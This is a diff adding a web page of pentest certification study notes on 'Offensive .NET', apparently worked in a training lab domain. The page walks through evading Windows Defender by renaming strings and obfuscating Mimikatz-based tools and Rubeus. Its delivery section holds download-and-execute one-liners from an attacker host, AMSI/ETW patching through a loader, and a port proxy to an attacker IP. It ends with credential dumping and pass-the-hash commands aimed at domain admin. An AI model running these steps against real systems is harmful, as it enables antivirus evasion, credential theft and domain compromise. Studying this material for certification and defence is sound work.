@@ -1,0 +1,787 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>4 - Offensive .NET |</title>
+<meta name="description" content="Use Minimal obfuscation and String manipulation to bypass Win Defender ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="4 - Offensive .NET">
+<meta property="og:url" content="http://localhost:4000/notes/crtp/offdotnet/">
+
+
+  <meta property="og:description" content="Use Minimal obfuscation and String manipulation to bypass Win Defender ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header5.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-17T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/crtp/offdotnet/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header5.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          4 - Offensive .NET
+
+        
+      </h1>
+      
+        <p class="page__lead">Use Minimal obfuscation and String manipulation to bypass Win Defender
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  3 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/" class="active">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="4 - Offensive .NET">
+    <meta itemprop="description" content="Use Minimal obfuscation and String manipulation to bypass Win Defender">
+    <meta itemprop="datePublished" content="2023-12-17T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#offensive-net">Offensive .NET</a>
+    <ul>
+      <li><a href="#tradecraft---av-bypass">Tradecraft - AV bypass</a></li>
+      <li><a href="#payload-delivery">Payload Delivery</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="offensive-net">Offensive .NET</h1>
+
+<p><strong>A repo of popular Offensive C# tools</strong>:</p>
+
+<p><a href="https://github.com/Flangvik/SharpCollection">SharpCollection on GitHub</a></p>
+
+<p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz on GitHub</a></p>
+
+<h2 id="tradecraft---av-bypass">Tradecraft - AV bypass</h2>
+
+<blockquote>
+  <p>We will focus mostly on bypass of signature based detection by Windows Defender</p>
+</blockquote>
+
+<p>For that, we can use techniques like Obfuscation, String Manipulation etc.</p>
+
+<p>We can use DefenderCheck:</p>
+
+<p><a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck on GitHub</a></p>
+
+<blockquote>
+  <p>To identify code and strings from a binary that Windows Defender may flag.</p>
+</blockquote>
+
+<p>This helps us in deciding on modifying the source code and minimal obfuscation.</p>
+
+<h3 id="sharpkatz">SharpKatz</h3>
+
+<p>Let’s check SharpKatz.exe for signatures using DefenderCheck</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DefenderCheck.exe</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Path</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Sharpkatz</span><span class="w"> </span><span class="nx">binary</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Open the project in Visual Studio.</li>
+  <li>Press <strong>CTRL + H</strong></li>
+  <li>Find and replace the string “Credentials” with “Credents” you can use any other string as an replacement. (Make sure that string is not present in the code)</li>
+  <li>Select the scope as <strong>Entire Solution</strong>.</li>
+  <li>Press <strong>Replace All</strong> button.</li>
+  <li>Build and recheck the binary with <em>DefenderCheck</em>.</li>
+  <li>Repeat above steps if still there is detection</li>
+</ul>
+
+<h3 id="safetykatz">Safetykatz</h3>
+
+<p>For SafetyKatz, we used the following steps</p>
+<ul>
+  <li>Download latest version of Mimikatz and <strong>Out-CompressedDll.ps1</strong></li>
+</ul>
+
+<p>Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Out-CompressedDll</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Path</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">mimikatz.exe</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> 	</span><span class="nx">outputfilename.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1">Out-CompressedDll.ps1 in PowerSploit</a></p>
+
+<ul>
+  <li>
+    <p>Copy the value of the variable <strong>$EncodedCompressedFile</strong> from the output file above and replace the value of <strong>compressedMimikatzString</strong> variable in the <strong>Constants.cs</strong> file of SafetyKatz.</p>
+  </li>
+  <li>Copy the byte size from the output file and replace it in <strong>Program.cs</strong> file on the line 111 &amp; 116.</li>
+  <li>Build and recheck the binary with <em>DefenderCheck</em></li>
+</ul>
+
+<h3 id="bettersafetykatz">BetterSafetyKatz</h3>
+
+<p>For BetterSafetyKatz, we used the following steps</p>
+<ul>
+  <li>Download the latest release of “mimikatz_trunk.zip” file.</li>
+  <li>Convert the file to base64 value</li>
+</ul>
+
+<p><img src="/assets/images/posts/crtp/3.png" alt="Alt text" class="align-center" /></p>
+
+<p>Modify the <strong>Program.cs</strong> file.</p>
+
+<p>– Added a new variable that contains the base64 value of <strong>mimikatz_trunk.zip</strong> file.
+– Comment the code that downloads or accepts the mimikatz file as an argument.
+– Convert the base64 string to bytes and pass it to <strong>zipStream</strong> variable</p>
+
+<p><img src="/assets/images/posts/crtp/4.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="rubeus">Rubeus</h3>
+
+<p>For Rubeus.exe, we used <strong>ConfuserEx</strong> to obfuscate the binary</p>
+
+<p><a href="https://github.com/mkaring/ConfuserEx">ConfuserEx on GitHub</a></p>
+
+<p>Launch ConfuserEx:</p>
+<ul>
+  <li>In Project tab select the Base Directory where the binary file is located.</li>
+  <li>In Project tab Select the Binary File that we want to obfuscate.</li>
+  <li>In Settings tab add the rules.</li>
+  <li>In Settings tab edit the rule and select the preset as <strong>Normal</strong>.</li>
+  <li>In Protect tab click on the protect button.</li>
+</ul>
+
+<blockquote>
+  <p>We will find the new obfuscated binary in the Confused folder under the Base Directory.</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/crtp/5.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>After obfuscating the binary with ConfuserEx rescan using DefenderCheck we can see the detection of GUID.</li>
+  <li>Generate and modify the GUID and compile Rubeus again and rerun the ConfuserEx on the Rubeus.exe binary.</li>
+</ul>
+
+<p><img src="/assets/images/posts/crtp/6.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="payload-delivery">Payload Delivery</h2>
+
+<p>We can use NetLoader to deliver our binary payloads.</p>
+
+<p><a href="https://github.com/Flangvik/NetLoader">NetLoader on GitHub</a></p>
+
+<p>It can be used to load binary from filepath or URL and patch AMSI &amp; ETW while executing:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://192.168.100.X/SafetyKatz.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\AssemblyLoad.exe</span><span class="w"> </span><span class="nx">http://192.168.100.X/Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://192.168.100.X/SafetyKatz.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="1---getting-da-through-dcorp-ci">[1] - Getting DA through dcorp-ci</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/sbloggingbypass.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
+</span><span class="c"># bypass ASMI manually</span><span class="w">
+</span><span class="n">iex</span><span class="w"> </span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;ip&gt;/PowerView.ps1'</span><span class="p">))</span><span class="w">
+</span><span class="nx">FInd-DomainUserLocation</span><span class="w">
+</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">machine</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">command</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">//example</span><span class="w"> </span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">hostname</span><span class="p">;</span><span class="n">whoami</span><span class="w">
+</span><span class="nx">iwr</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">/Loader.exe</span><span class="w"> </span><span class="nt">-OutfFile</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w">
+</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorp-mgmt\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[NOTE] Windows Defender will block all binaries/executables that are downloaded from remote sources
+So, we will configure a portforward to request payload from local loopback.</p>
+</blockquote>
+
+<blockquote>
+  <p>Even if Defender is watching this, because is not remotely the payload its not blocked</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="err">“</span><span class="nx">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="err">&lt;</span><span class="n">attacker</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;”</span><span class="w">
+</span><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w"> </span><span class="nx">sekurlsa::ekeys</span><span class="w"> </span><span class="nx">exit</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Create a new PS with high integrity:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">dc</span><span class="w"> </span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/creanetonly:C:\windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="2---getting-da-through-derivative-local-admin">[2] - Getting DA through derivative local admin</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
+</span><span class="nx">Find-PSRemotingLocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+
+</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">the</span><span class="w"> </span><span class="nx">machine</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">local</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nx">access</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we have to bypass AMSI here, but the shell is in <strong>ConstrainedLanguage</strong> Mode</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we need to search what kind o policy is blocking us : <strong>applocker</strong>, <strong>wdigest</strong></p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">RuleCollections</span><span class="w">
+</span></code></pre></div></div>
+<p>or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsoft\Windows\SRPV2</span><span class="w"> </span><span class="c"># "AppLocker = Software Restrict Policy Version 2"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Lets copy mimiEx to the target machine</p>
+
+<p>From attacker:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Copy-Item</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-MimiEx.ps1</span><span class="w"> </span><span class="nx">\\dcorp-adminsrv.dollarcorp.moneycorp.local\c</span><span class="err">$</span><span class="nx">\</span><span class="s1">'Program Files'</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Enter the machine again with PSSession and execute the MimiEx.ps1</p>
+</blockquote>
+
+<p>From attacker:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="err">“</span><span class="nx">sekurlsa::opassth</span><span class="err">”</span><span class="w"> </span><span class="nx">/user:srvadmin</span><span class="w"> </span><span class="nx">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/run:cmd.exe</span><span class="s2">" “exit”
+</span></code></pre></div></div>
+
+<ul>
+  <li>This will open a shell with the hash we got with <strong>mimiEx</strong></li>
+  <li>Firstly found what machines this user has local admin access</li>
+</ul>
+
+<blockquote>
+  <p>[EXTRA] <strong>Session: Service From 0</strong> = means that there is a service using the account as a service account
+so, there is a chance of cached cleartext password on mimikatz results</p>
+</blockquote>
+
+<p>In the new shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
+</span><span class="n">Find-PSRemotingLocalAdminAccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>At this point, we can access dump the credentials like we did before in the last path
+Opening a portforward and dump through local loopback                                          ]</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#crtp" class="page__taxonomy-item" rel="tag">crtp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-17T00:00:00+06:00">December 17, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=4+-+Offensive+.NET%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Foffdotnet%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Foffdotnet%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Foffdotnet%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/crtp/latmov/" class="pagination--pager" title="3 - Lateral Movement
+">Previous</a>
+    
+    
+      <a href="/notes/crtp/domdom/" class="pagination--pager" title="5 - AD Persistence
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
